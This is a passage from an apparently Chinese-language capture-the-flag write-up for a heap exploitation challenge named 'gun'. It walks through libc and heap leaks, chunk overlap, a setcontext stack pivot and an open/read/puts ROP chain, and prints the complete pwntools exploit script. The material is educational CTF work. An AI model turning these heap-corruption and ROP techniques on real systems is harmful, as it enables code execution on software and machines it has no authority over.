class="hljs-string">&#x27;libc_base :&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment"># release</span><br>load(<span class="hljs-number">1</span>)<br>shoot(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<p>那么现在要如何实现堆重叠, 然而在程序逻辑中, 加载后的子弹不会清0, 残余的数据指针仍然还在, 那么若我们能够伪造一个chunk, 释放该chunk, 修改释放后的chunk的fd, 即可实现任意地址写入</p>
<p>实现heap overlap</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># set heap chunk overlap</span><br>n = <span class="hljs-number">9</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>	buy(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;A&#x27;</span> + <span class="hljs-built_in">str</span>(_) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>	load(n - i - <span class="hljs-number">1</span>)<br>shoot(n)<br><br>p = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">0x10</span><br>p += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) <span class="hljs-comment"># fake chunk, because chunk overlap, then we can control it</span><br>p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>buy(<span class="hljs-number">0x410</span>, p) <span class="hljs-comment"># 0</span><br><br>buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;20: 0\n&#x27;</span>) <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>	buy(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;10: &#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 2 ~ 8</span><br><br>load(<span class="hljs-number">7</span>)<br>load(<span class="hljs-number">1</span>) <span class="hljs-comment"># 1</span><br>shoot(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure>



<p>泄漏heap且释放我们overlap的大chunk, 以实现我们可以控制伪造chunk的fd</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># leak heap base</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br><br>buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 0</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;The &#x27;</span>)<br>leak = u64(r(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>heap_base = leak - (<span class="hljs-number">0x55962cf186e0</span> - <span class="hljs-number">0x55962cf18000</span> )<br>li(<span class="hljs-string">&#x27;heap base&#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure>



<p>堆栈迁移至heap中并且打rop</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># stack move to heap and rop</span><br>	libc.address = libc_base<br>	setcontext = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">0x3d</span><br>	free_hook  = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>	rdx_and_call = libc_base + <span class="hljs-number">0x1547a0</span><br>	pop_rax = libc_base + <span class="hljs-number">0x4a550</span><br>	pop_rdi = libc_base + <span class="hljs-number">0x26b72</span><br>	pop_rsi = libc_base + <span class="hljs-number">0x27529</span><br>	pop_rdx_r12 = libc_base + <span class="hljs-number">0x11c1e1</span><br>	ret = libc_base + <span class="hljs-number">0x25679</span><br>	syscall = libc_base + <span class="hljs-number">0x2584d</span><br><br>	p = p64(<span class="hljs-number">0</span>)<br>	p += p64(heap_base + <span class="hljs-number">0x750</span> + <span class="hljs-number">0x10</span>) <span class="hljs-comment"># set rdx</span><br>	p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>	p += p64(setcontext) <span class="hljs-comment"># call [rdx + 0x20]</span><br>	p += <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span> <span class="hljs-comment"># heap_base + 0x750 + 0x38 = 0x788</span><br>	p = p.ljust(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># rdx + 0x90</span><br><br>	p += p64(<span class="hljs-number">0</span>)         <span class="hljs-comment"># prev_size</span><br>	p += p64(<span class="hljs-number">0x31</span>)      <span class="hljs-comment"># size</span><br>	p += p64(free_hook) <span class="hljs-comment"># fd</span><br>	p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>	p += p64(heap_base + <span class="hljs-number">0x750</span> + <span class="hljs-number">0x100</span>) <span class="hljs-comment"># mov rsp, [rdx + 0xa0]</span><br>	p += p64(ret) <span class="hljs-comment"># avoid push rcx</span><br>	p = p.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>	flag_addr = heap_base + <span class="hljs-number">0x788</span><br>	<span class="hljs-comment"># open	</span><br>	rop_open = flat([<br>	pop_rdi , flag_addr,<br>	pop_rsi , <span class="hljs-number">0</span>,<br>	libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>	])<br><br>	rop_read = flat([<br>	pop_rdi, <span class="hljs-number">3</span>,<br>	pop_rsi, flag_addr,<br>	pop_rdx_r12, <span class="hljs-number">0x100</span>, <span class="hljs-number">0</span>,<br>	libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>	])<br><br>	rop_puts = flat([<br>	pop_rdi, flag_addr,<br>	libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>	])<br><br>	rop = rop_open<br>	rop += rop_read<br>	rop += rop_puts<br>	p += rop<br>	p += <span class="hljs-string">b&#x27;\n&#x27;</span><br>	buy(<span class="hljs-number">0x1c0</span>, p) <span class="hljs-comment"># 0</span><br><br>	li(<span class="hljs-string">&#x27;setcontext: &#x27;</span> + <span class="hljs-built_in">hex</span>(setcontext))<br><br>	buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># for ajust  1</span><br>	buy(<span class="hljs-number">0x20</span>, p64(rdx_and_call) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># 2</span><br>	load(<span class="hljs-number">0</span>)<br>	<span class="hljs-comment">#db()</span><br>	shoot(<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure>

<p>以上堆栈迁移与rop是同一个payload进行的, 需要精心计算, 还有一个坑就是在setcontext中有个判断, 失败的话就执行push rcx, 而rcx 为[rdx + 0xa8], 则在[rdx + 0xa8]处需要添加一个ret指令的地址,这样才能连接到我们精心构造的rop</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-comment"># Env: Linux arch 5.8.14-arch1-1</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>elf_path  = <span class="hljs-string">&#x27;gun&#x27;</span><br><span class="hljs-comment">#libc_path = &#x27;./libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>server_port = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">1</span><br>LIBC = <span class="hljs-number">1</span><br><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shoot</span>(<span class="hljs-params">t</span>):<br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(t))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">n</span>):<br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(n))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">n, d</span>):<br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(n))<br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>	sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>	<br>	<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	<span class="hljs-comment"># leak libc</span><br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;I0gan&#x27;</span>)<br>	buy(<span class="hljs-number">0x450</span>, <span class="hljs-string">&#x27;X&#x27;</span> * <span class="hljs-number">0x10</span> + <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 0</span><br>	buy(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">8</span> + <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 1</span><br>	load(<span class="hljs-number">0</span>)<br>	shoot(<span class="hljs-number">1</span>)<br>	buy(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;X&#x27;</span> * <span class="hljs-number">8</span> +<span class="hljs-string">&#x27;\n&#x27;</span>); <span class="hljs-comment"># 0</span><br>	load(<span class="hljs-number">0</span>)<br>	shoot(<span class="hljs-number">1</span>)<br>	libc_base = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>) - <span class="hljs-number">0x1ebf80</span> - <span class="hljs-number">96</span><br>	li(<span class="hljs-string">&#x27;libc_base :&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	<span class="hljs-comment"># release</span><br>	load(<span class="hljs-number">1</span>)<br>	shoot(<span class="hljs-number">1</span>)<br><br><br>	<span class="hljs-comment"># leak heap base</span><br>	n = <span class="hljs-number">9</span><br>	<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>		buy(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;A&#x27;</span> + <span class="hljs-built_in">str</span>(_) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>		load(n - i - <span class="hljs-number">1</span>)<br>	shoot(n)<br><br>	p = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">0x10</span><br>	p += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>)<br>	p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>	buy(<span class="hljs-number">0x410</span>, p) <span class="hljs-comment"># 0</span><br>	buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;a\n&#x27;</span>) <span class="hljs-comment"># 1</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>		buy(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;A\n&#x27;</span>) <span class="hljs-comment"># 1 ~ 7</span><br><br>	load(<span class="hljs-number">7</span>)<br>	load(<span class="hljs-number">1</span>) <span class="hljs-comment"># 1</span><br>	shoot(<span class="hljs-number">3</span>)<br><br>	load(<span class="hljs-number">0</span>)<br>	shoot(<span class="hljs-number">1</span>)<br><br>	buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 0</span><br>	load(<span class="hljs-number">0</span>)<br>	shoot(<span class="hljs-number">1</span>)<br>	ru(<span class="hljs-string">&#x27;The &#x27;</span>)<br>	leak = u64(r(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>	heap_base = leak - (<span class="hljs-number">0x55962cf186e0</span> - <span class="hljs-number">0x55962cf18000</span> )<br>	li(<span class="hljs-string">&#x27;heap base&#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br>	<br>	libc.address = libc_base<br>	setcontext = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">0x3d</span><br>	free_hook  = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>	rdx_and_call = libc_base + <span class="hljs-number">0x1547a0</span><br>	pop_rax = libc_base + <span class="hljs-number">0x4a550</span><br>	pop_rdi = libc_base + <span class="hljs-number">0x26b72</span><br>	pop_rsi = libc_base + <span class="hljs-number">0x27529</span><br>	pop_rdx_r12 = libc_base + <span class="hljs-number">0x11c1e1</span><br>	ret = libc_base + <span class="hljs-number">0x25679</span><br>	syscall = libc_base + <span class="hljs-number">0x2584d</span><br><br>	p = p64(<span class="hljs-number">0</span>)<br>	p += p64(heap_base + <span class="hljs-number">0x750</span> + <span class="hljs-number">0x10</span>) <span class="hljs-comment"># set rdx</span><br>	p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>	p += p64(setcontext) <span class="hljs-comment"># call [rdx + 0x20]</span><br>	p += <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span> <span class="hljs-comment"># heap_base + 0x750 + 0x38 = 0x788</span><br>	p = p.ljust(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># rdx + 0x90</span><br><br>	p += p64(<span class="hljs-number">0</span>)         <span class="hljs-comment"># prev_size</span><br>	p += p64(<span class="hljs-number">0x31</span>)      <span class="hljs-comment"># size</span><br>	p += p64(free_hook) <span class="hljs-comment"># fd</span><br>	p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>	p += p64(heap_base + <span class="hljs-number">0x750</span> + <span class="hljs-number">0x100</span>) <span class="hljs-comment"># mov rsp, [rdx + 0xa0]</span><br>	p += p64(ret) <span class="hljs-comment"># avoid push rcx</span><br>	p = p.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>	flag_addr = heap_base + <span class="hljs-number">0x788</span><br>	<span class="hljs-comment"># open	</span><br>	rop_open = flat([<br>	pop_rdi , flag_addr,<br>	pop_rsi , <span class="hljs-number">0</span>,<br>	libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>	])<br><br>	rop_read = flat([<br>	pop_rdi, <span class="hljs-number">3</span>,<br>	pop_rsi, flag_addr,<br>	pop_rdx_r12, <span class="hljs-number">0x100</span>, <span class="hljs-number">0</span>,<br>	libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>	])<br><br>	rop_puts = flat([<br>	pop_rdi, flag_addr,<br>	libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>	])<br><br>	rop = rop_open<br>	rop += rop_read<br>	rop += rop_puts<br>	p += rop<br>	p += <span class="hljs-string">b&#x27;\n&#x27;</span><br>	buy(<span class="hljs-number">0x1c0</span>, p) <span class="hljs-comment"># 0</span><br><br>	li(<span class="hljs-string">&#x27;setcontext: &#x27;</span> + <span class="hljs-built_in">hex</span>(setcontext))<br><br>	buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># for ajust  1</span><br>	buy(<span class="hljs-number">0x20</span>, p64(rdx_and_call) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># 2</span><br>	load(<span class="hljs-number">0</span>)<br>	<span class="hljs-comment">#db()</span><br>	shoot(<span class="hljs-number">1</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:00000000001547A0                 mov     rdx, [rdi+8]</span><br><span class="hljs-string">.text:00000000001547A4                 mov     [rsp+0C8h+var_C8], rax</span><br><span class="hljs-string">.text:00000000001547A8                 call    qword ptr [rdx+20h]</span><br><span class="hljs-string">.text:00000000001547AB                 mov     qword ptr [rbx], 0</span><br><span class="hljs-string">.text:00000000001547B2                 mov     rax, [rsp+0C8h+var_C8]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment">#setcontext</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># 0x7f6c8f6f21c6 &lt;setcontext+294&gt;    mov    rcx, qword ptr [rdx + 0xa8]</span><br><span class="hljs-comment"># push rcx</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:00000000000580DD                 mov     rsp, [rdx+0A0h]</span><br><span class="hljs-string">.text:00000000000580E4                 mov     rbx, [rdx+80h]</span><br><span class="hljs-string">.text:00000000000580EB                 mov     rbp, [rdx+78h]</span><br><span class="hljs-string">.text:00000000000580EF                 mov     r12, [rdx+48h]</span><br><span class="hljs-string">.text:00000000000580F3                 mov     r13, [rdx+50h]</span><br><span class="hljs-string">.text:00000000000580F7                 mov     r14, [rdx+58h]</span><br><span class="hljs-string">.text:00000000000580FB                 mov     r15, [rdx+60h]</span><br><span class="hljs-string">.text:00000000000580FF                 test    dword ptr fs:48h, 2</span><br><span class="hljs-string">.text:000000000005810B                 jz      loc_581C6</span><br><span class="hljs-string">.text:0000000000058111                 mov     rsi, [rdx+3A8h]</span><br><span class="hljs-string">.text:0000000000058118                 mov     rdi, rsi</span><br><span class="hljs-string">.text:000000000005811B                 mov     rcx, [rdx+3B0h]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>	<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br><br>	exploit()<br>	finish()<br></code></pre></td></tr></table></figure>









<h2 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h2><h3 id="应付orw"><a href="#应付orw" class="headerlink" title="应付orw"></a>应付orw</h3><h4 id="打入堆栈中"><a href="#打入堆栈中" class="headerlink" title="打入堆栈中"></a>打入堆栈中</h4><p>泄漏libc中的environ, 该变量中储存的是stack中的环境变量地址,这个可以泄漏堆栈地址, 从而可以打入堆栈中进行rop</p>
<h4 id="堆栈迁移至堆"><a href="#堆栈迁移至堆" class="headerlink" title="堆栈迁移至堆"></a>堆栈迁移至堆</h4><p>采用setcontext函数进行设置rsp, 然而再设置rsp的时候是根据rdx寄存器来进行设定的, 而平时在堆中, 若我们可以控制一个rdi, 找到一个rdx与rdi的对应关系, 我们就可以间接的修改rsp,在进行ret的时候就可以达到rop</p>
<p>找一个跳板</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mov    rdx, qword ptr [rdi + 8]<br>mov    qword ptr [rsp], rax<br>call   qword ptr [rdx + 0x20] &lt;setcontext+61&gt;<br></code></pre></td></tr></table></figure>

<p>找到setcontext函数 + 61处</p>
